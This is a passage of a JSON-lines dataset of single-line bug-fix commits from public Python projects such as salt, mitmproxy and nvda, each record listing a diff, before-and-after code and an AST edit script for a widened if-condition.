[\"unary_operator\", \"N2\"], 2], [\"Insert\", \"N2\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N2\", [\"integer:1\", \"T\"], 1]]"}
{"project": "st2", "commit_sha": "81b63bb982fc1e4abcb92b5c1a55c7b1196dc9cb", "parent_sha": "faf0cdb7f90b23fc726d2379987eb733c3238e2a", "file_path": "st2api/st2api/controllers/v1/webhooks.py", "project_url": "https://github.com/ojosdegris/st2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ class WebhooksController(pecan.rest.RestController):\n             msg = 'Invalid JSON body: %s' % (body)\n             return pecan.abort(http_client.BAD_REQUEST, msg)\n \n-        if hook == 'st2':\n+        if hook == 'st2' or hook == 'st2/':\n             return self._handle_st2_webhook(body)\n \n         if not self._is_valid_hook(hook):\n", "before": "if hook == 'st2' : return self . _handle_st2_webhook ( body )", "after": "if hook == 'st2' or hook == 'st2/' : return self . _handle_st2_webhook ( body )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 50], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:hook\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'st2/'\", \"T\"], 2]]"}
{"project": "TXPipe", "commit_sha": "1d77ae161dbb0f510bb79d1c369756829a3d93dc", "parent_sha": "0ecc9d5ebe155bbaad870fb699071444c970ee3e", "file_path": "txpipe/twopoint_fourier.py", "project_url": "https://github.com/LSSTDESC/TXPipe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -260,7 +260,7 @@ class TXTwoPointFourier(PipelineStage):\n         return cache\n \n     def save_workspace_cache(self, cache, spaces):\n-        if cache is None:\n+        if (cache is None) or (cache == {}):\n             return\n \n         for space in spaces.values():\n", "before": "if cache is None : return", "after": "if ( cache is None ) or ( cache == { } ) : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 19], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"comparison_operator\", 3, 12, 3, 25], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:cache\", \"T\"], 0], [\"Insert\", \"N3\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N3\", [\"dictionary\", \"N4\"], 2], [\"Insert\", \"N4\", [\"{:{\", \"T\"], 0], [\"Insert\", \"N4\", [\"}:}\", \"T\"], 1]]"}
{"project": "salt", "commit_sha": "2509d3688878dc818e7b6eb33a8db4590be2065a", "parent_sha": "2cb6634c6b00ebe4fd2667701b44c02d3b692702", "file_path": "tests/integration/modules/test_service.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ class ServiceModuleTest(ModuleCase):\n         systemd = salt.utils.systemd.booted()\n \n         # check service was not enabled\n-        if systemd:\n+        if systemd or salt.utils.is_windows():\n             self.assertIn('ERROR', enable)\n         else:\n             self.assertFalse(enable)\n", "before": "if systemd : self . assertIn ( 'ERROR' , enable ) else : self . assertFalse ( enable )", "after": "if systemd or salt . utils . is_windows ( ) : self . assertIn ( 'ERROR' , enable ) else : self . assertFalse ( enable )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 37], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:systemd\", 3, 12, 3, 19], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:is_windows\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"):)\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:salt\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:utils\", \"T\"], 2]]"}
{"project": "salt", "commit_sha": "38bbd5fc20da9d504706d742cb462bc7e81eecc3", "parent_sha": "d369958db4106e57df68b3297173f17a5415c229", "file_path": "salt/client.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ class LocalClient(object):\n         user = getpass.getuser()\n         # if our user is root, look for other ways to figure out\n         # who we are\n-        if user == 'root':\n+        if user == 'root' or 'SUDO_USER' in os.environ:\n             env_vars = ['SUDO_USER', 'USER', 'USERNAME']\n             for evar in env_vars:\n                 if evar in os.environ:\n", "before": "if user == 'root' : env_vars = [ 'SUDO_USER' , 'USER' , 'USERNAME' ] for evar in env_vars : if evar in os . environ : ", "after": "if user == 'root' or 'SUDO_USER' in os . environ : env_vars = [ 'SUDO_USER' , 'USER' , 'USERNAME' ] for evar in env_vars : if evar in os . environ : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 39], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 26], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'SUDO_USER'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:environ\", \"T\"], 2]]"}
{"project": "mythbox", "commit_sha": "ce5e880c12b7bb5a2666c55940cfd3af1b516117", "parent_sha": "fe2c70c4d0e4ba3512abc59ff6435dc3d59cd8ba", "file_path": "resources/src/mythbox/ui/schedules.py", "project_url": "https://github.com/dhamaniasad/mythbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -357,9 +357,9 @@ class ScheduleDialog(BaseDialog):\n         value = xbmcgui.Dialog().numeric(0, heading, str(current))\n-        if value == str(current):\n+        if value is None or value == str(current):\n             return current\n-        \n+\n         result = int(value)\n         \n         if min is not None and result < min:\n", "before": "if value == str ( current ) : return current", "after": "if value is None or value == str ( current ) : return current", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 1, 9, 2, 27], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 1, 12, 1, 33], 2], [\"Insert\", \"N1\", [\"identifier:value\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "fbchat", "commit_sha": "981a8d6a721da1d7cd92ad6ec79b31c65dee983f", "parent_sha": "75d6b89ca4a5cbc23db9cd47ebcd82f6d344fda7", "file_path": "fbchat/client.py", "project_url": "https://github.com/winbotscript/fbchat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -214,7 +214,7 @@ class Client(object):\n         }\n \n         r = self._post(\"https://www.facebook.com/ajax/mercury/threadlist_info.php\", data)\n-        if not r.ok:\n+        if not r.ok or len(r.text) == 0:\n             return None\n \n         j = get_json(r.text)\n", "before": "if not r . ok : return None", "after": "if not r . ok or len ( r . text ) == 0 : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 12, 3, 20], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 20], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:r\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:text\", \"T\"], 2]]"}
{"project": "mitmproxy", "commit_sha": "8702c9357d71b38fcc1175b3a234c563b995d3d7", "parent_sha": "c76d83f749079b88a2b7b7a76545a7d571ed96a5", "file_path": "netlib/encoding.py", "project_url": "https://github.com/madhusai3113/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def decode(encoded, encoding, errors='strict'):\n-    if len(encoded) == 0:\n+    if len(encoded) == 0 or encoding == \"none\":\n         return encoded\n \n     global _cache\n", "before": "if len ( encoded ) == 0 : return encoded", "after": "if len ( encoded ) == 0 or encoding == \"none\" : return encoded", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 0, 5, 1, 23], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 0, 8, 0, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:encoding\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"none\\\"\", \"T\"], 2]]"}
{"project": "mitmproxy", "commit_sha": "c16417248ce571ad09ea18ac7280472b448c23f4", "parent_sha": "8702c9357d71b38fcc1175b3a234c563b995d3d7", "file_path": "netlib/encoding.py", "project_url": "https://github.com/madhusai3113/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def encode(decoded, encoding, errors='strict'):\n-    if len(decoded) == 0:\n+    if len(decoded) == 0 or encoding == \"none\":\n         return decoded\n \n     global _cache\n", "before": "if len ( decoded ) == 0 : return decoded", "after": "if len ( decoded ) == 0 or encoding == \"none\" : return decoded", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 0, 5, 1, 23], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 0, 8, 0, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:encoding\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"none\\\"\", \"T\"], 2]]"}
{"project": "mitmproxy", "commit_sha": "4c292b0197d820e9e108aa05b10927107a0503c3", "parent_sha": "59aff68e7ac8f623b6e1b22e31549a91dbc5c0eb", "file_path": "test/netlib/test_tcp.py", "project_url": "https://github.com/madhusai3113/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ class HangHandler(tcp.BaseHandler):\n                 self.connection.setblocking(0)\n                 ret = self.connection.recv(1)\n                 # Client connection is dead...\n-                if ret == \"\":\n+                if ret == \"\" or ret == b\"\":\n                     return\n             except socket.error:\n                 pass\n", "before": "if ret == \"\" : return", "after": "if ret == \"\" or ret == b\"\" : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 27], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 29], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:ret\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:b\\\"\\\"\", \"T\"], 2]]"}
{"project": "mwlib", "commit_sha": "cc21bd3c505aa3c66e584eb28699301d17ad6ae9", "parent_sha": "c73dd66d0f99d970acfdc9cfaa229429d3f57333", "file_path": "mwlib/parser/nodes.py", "project_url": "https://github.com/stepping-stone/mwlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -473,7 +473,7 @@ class ImageLink(Link):\n \n             x = x.caption.lower().strip()\n             \n-            if x == 'thumb' or x=='thumbnail':\n+            if x == 'thumb' or x=='thumbnail' or x == 'miniatur':\n                 self.thumb = True\n                 del self.children[idx]\n                 continue\n", "before": "if x == 'thumb' or x == 'thumbnail' : self . thumb = True del self . children [ idx ] continue", "after": "if x == 'thumb' or x == 'thumbnail' or x == 'miniatur' : self . thumb = True del self . children [ idx ] continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 16, 3, 46], [\"boolean_operator\", 3, 16, 3, 46], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 46], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 46], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:x\", \"T\"], 0], [\"Insert\", \"N0\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'miniatur'\", \"T\"], 2]]"}
{"project": "mwlib", "commit_sha": "0f3b7f994f128574a245d5f865ad679f354c5d7a", "parent_sha": "a20918796e4ba2130d4202e1d8367fab12b7d7e7", "file_path": "mwlib/authors.py", "project_url": "https://github.com/stepping-stone/mwlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class inspect_authors(object):\n \n         authors = list(self.authors)\n         authors.sort()\n-        if self.num_anon:\n+        if authors or self.num_anon:\n             authors.append(\"%s:%d\" % (self.ANON, self.num_anon))  # append anon\n         return authors\n \n", "before": "if self . num_anon : authors . append ( \"%s:%d\" % ( self . ANON , self . num_anon ) )", "after": "if authors or self . num_anon : authors . append ( \"%s:%d\" % ( self . ANON , self . num_anon ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 80], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:authors\", \"T\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 25], 2]]"}
{"project": "robotpy-wpilib-utilities", "commit_sha": "36f40531204919f0a51555e34a07c53b972a7a77", "parent_sha": "f061cbcf6f8ec7c2dbc41b5dced7849da392bda0", "file_path": "magicbot/magicrobot.py", "project_url": "https://github.com/robotpy/robotpy-wpilib-utilities", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -435,7 +435,7 @@ class MagicRobot(wpilib.SampleRobot,\n         self.logger.debug(\"Injecting magic variables into %s\", cname)\n         \n         for n in dir(component):\n-            if n.startswith('_'):\n+            if n.startswith('_') or isinstance(getattr(type(component), n, True), property):\n                 continue\n             \n             inject_type = getattr(component, n)\n", "before": "if n . startswith ( '_' ) : continue", "after": "if n . startswith ( '_' ) or isinstance ( getattr ( type ( component ) , n , True ) , property ) : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 25], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 33], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"call\", \"N3\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:property\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:getattr\", \"T\"], 0], [\"Insert\", \"N3\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"call\", \"N5\"], 1], [\"Insert\", \"N4\", [\",:,\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:n\", \"T\"], 3], [\"Insert\", \"N4\", [\",:,\", \"T\"], 4], [\"Insert\", \"N4\", [\"true:True\", \"T\"], 5], [\"Insert\", \"N4\", [\"):)\", \"T\"], 6], [\"Insert\", \"N5\", [\"identifier:type\", \"T\"], 0], [\"Insert\", \"N5\", [\"argument_list\", \"N6\"], 1], [\"Insert\", \"N6\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N6\", [\"identifier:component\", \"T\"], 1], [\"Insert\", \"N6\", [\"):)\", \"T\"], 2]]"}
{"project": "robotpy-wpilib-utilities", "commit_sha": "bd5dc2043355c9f127c4e357b36d0284053d4c6b", "parent_sha": "b74dad6f11f8df14bff9d54b80755abe01d0a3bc", "file_path": "robotpy_ext/misc/precise_delay.py", "project_url": "https://github.com/robotpy/robotpy-wpilib-utilities", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class PreciseDelay:\n             # to run more efficiently -- otherwise full tests are dog slow\n             try:\n                 import pyfrc.config\n-                if pyfrc.config.mode == 'test':\n+                if pyfrc.config.mode == 'test' or pyfrc.config.mode == 'deploy':\n                     self.wait = self._wait_unit_tests\n             except:\n                 pass\n", "before": "if pyfrc . config . mode == 'test' : self . wait = self . _wait_unit_tests", "after": "if pyfrc . config . mode == 'test' or pyfrc . config . mode == 'deploy' : self . wait = self . _wait_unit_tests", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 54], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 47], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'deploy'\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:mode\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:pyfrc\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:config\", \"T\"], 2]]"}
{"project": "mitmproxy", "commit_sha": "46901d1d55cb5bad86e17e093b85ade8111315aa", "parent_sha": "168c72a55f82d24c1dc332cb44a9fe4a0d57f8ce", "file_path": "mitmproxy/addons/save.py", "project_url": "https://github.com/mariuszkrzaczkowski/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class Save:\n                     )\n             else:\n                 self.filt = None\n-        if \"save_stream_file\" in updated:\n+        if \"save_stream_file\" in updated or \"save_stream_filter\" in updated:\n             if self.stream:\n                 self.done()\n             if ctx.options.save_stream_file:\n", "before": "if \"save_stream_file\" in updated : if self . stream : self . done ( ) if ctx . options . save_stream_file : ", "after": "if \"save_stream_file\" in updated or \"save_stream_filter\" in updated : if self . stream : self . done ( ) if ctx . options . save_stream_file : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 45], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 41], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:\\\"save_stream_filter\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:updated\", \"T\"], 2]]"}
{"project": "nvda", "commit_sha": "9c488e68d652779a6bc2925dd876b4c0d2622909", "parent_sha": "0f154aa3e4a95c93a867e2f8d6e3e1b688c55e6e", "file_path": "source/review.py", "project_url": "https://github.com/mariuszkrzaczkowski/nvda", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -148,7 +148,7 @@ def handleCaretMove(pos):\n \t\tobj=pos\r\n \tmode=getCurrentMode()\r\n \tif isinstance(obj,NVDAObject):\r\n-\t\tif not mode=='object':\r\n+\t\tif not mode=='object' or obj is not api.getNavigatorObject():\r\n \t\t\treturn\r\n \telif isinstance(obj,TreeInterceptor):\r\n \t\tif mode not in ('object','document'):\r\n", "before": "if not mode == 'object' : return", "after": "if not mode == 'object' or obj is not api . getNavigatorObject ( ) : return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 6, 3, 24], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 10, 3, 24], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:obj\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 3], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N4\"], 1], [\"Insert\", \"N3\", [\"identifier:api\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:getNavigatorObject\", \"T\"], 2], [\"Insert\", \"N4\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N4\", [\"):)\", \"T\"], 1]]"}
{"project": "pygameweb", "commit_sha": "99ed96d12bdd002531f594703ddb5ad94564fe8a", "parent_sha": "6a04202114e487b636f6743bdda2b298ebd7f1a8", "file_path": "pygameweb/static/views.py", "project_url": "https://github.com/pygame/pygameweb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ def add_file(app, static_blueprint, file):\n def add_static_blueprint(app):\n     \"\"\" to the app.\n     \"\"\"\n-    if app.config['DEBUG']:\n+    if 1 or app.config['DEBUG']:\n         # Don't really need these files in production. A real webserver serves them.\n         for folder in folders:\n             add_folder(app, static_blueprint, folder)\n", "before": "if app . config [ 'DEBUG' ] : for folder in folders : add_folder ( app , static_blueprint , folder )", "after": "if 1 or app . config [ 'DEBUG' ] : for folder in folders : add_folder ( app , static_blueprint , folder )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 54], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"integer:1\", \"T\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"subscript\", 3, 8, 3, 27], 2]]"}
{"project": "pantheon", "commit_sha": "b6518e3007ba7c360190c6e19c338ad0f2adcf48", "parent_sha": "a3dbee0029ced6c6103091241f60e1fc78ed5018", "file_path": "analyze/generate_report.py", "project_url": "https://github.com/StanfordSNR/pantheon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ class GenerateReport:\n                     '\\\\PantheonFig{%(acklink_throughput)s}\\n\\n'\n                     '\\\\PantheonFig{%(acklink_delay)s}\\n\\n' % str_dict)\n \n-                if cc != self.cc_schemes[-1]:\n+                if cc != self.cc_schemes[-1] or run_id != self.run_times:\n                     self.latex.write('\\\\newpage\\n\\n')\n \n         self.latex.write('\\\\end{document}')\n", "before": "if cc != self . cc_schemes [ - 1 ] : self . latex . write ( '\\\\newpage\\n\\n' )", "after": "if cc != self . cc_schemes [ - 1 ] or run_id != self . run_times : self . latex . write ( '\\\\newpage\\n\\n' )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 54], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 45], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:run_id\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:run_times\", \"T\"], 2]]"}
{"project": "zing", "commit_sha": "fce95f172177160580a2bb76c7162a98e0568f03", "parent_sha": "5612ad5f5e3e1bbc48353d6c83cf63f440940b0c", "file_path": "pootle/core/mixins/treeitem.py", "project_url": "https://github.com/evernote/zing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -288,7 +288,7 @@ class CachedTreeItem(TreeItem):\n                                               self.get_cachekey(),\n                                               self.__class__),\n             )\n-            if not from_update:\n+            if not from_update or settings.DEBUG:\n                 # get initial (empty, zero) value\n                 result = getattr(CachedTreeItem, '_%s' % name)()\n \n", "before": "if not from_update : result = getattr ( CachedTreeItem , '_%s' % name ) ( )", "after": "if not from_update or settings . DEBUG : result = getattr ( CachedTreeItem , '_%s' % name ) ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 16, 3, 31], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:from_update\", 3, 20, 3, 31], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:settings\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:DEBUG\", \"T\"], 2]]"}
{"project": "ida-efitools", "commit_sha": "8d3aad194501bc9904c8dc031ef4cdb91aa374ed", "parent_sha": "f962e80c694aa3552a53a01614f2367d4a298854", "file_path": "core/objects/instruction.py", "project_url": "https://github.com/al3xtjames/ida-efitools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ class _OperandType:\n     def __cmp__(self, other):\n         if isinstance(other, _OperandType):\n             return cmp(self.__op_type, other.__op_type)\n-        elif type(other) is int:\n+        elif type(other) is int or long:\n             return cmp(self.__op_type, other)\n         raise NotImplementedError\n \n", "before": "if isinstance ( other , _OperandType ) : return cmp ( self . __op_type , other . __op_type ) elif type ( other ) is int : return cmp ( self . __op_type , other )", "after": "if isinstance ( other , _OperandType ) : return cmp ( self . __op_type , other . __op_type ) elif type ( other ) is int or long : return cmp ( self . __op_type , other )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 9, 4, 46], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 14, 3, 32], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:long\", \"T\"], 2]]"}
{"project": "epack", "commit_sha": "99d6877eee0427d5e3a349f5cc49f525240b03fb", "parent_sha": "8d8abbfffb75c9bfd0b5d2d95d6e7f00ad6b5624", "file_path": "epack.py", "project_url": "https://github.com/wfx/epack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class Application(object):\n \t\telementary.exit()\n \n \tdef extract(self, obj):\n-\t\tif self.file.type == \"application/tar.gz\":\n+\t\tif self.file.type == \"application/tar.gz\" or self.file.type == \"application/x-gzip\":\n \t\t\tcmd(cmd=\"tar\", arg=\"xzf \"+self.file.name)\n \t\telif self.file.type == \"application/bz2\":\n \t\t\tcmd(cmd=\"bunzip2\", arg=self.file.name)\n", "before": "if self . file . type == \"application/tar.gz\" : cmd ( cmd = \"tar\" , arg = \"xzf \" + self . file . name ) elif self . file . type == \"application/bz2\" : cmd ( cmd = \"bunzip2\" , arg = self . file . name )", "after": "if self . file . type == \"application/tar.gz\" or self . file . type == \"application/x-gzip\" : cmd ( cmd = \"tar\" , arg = \"xzf \" + self . file . name ) elif self . file . type == 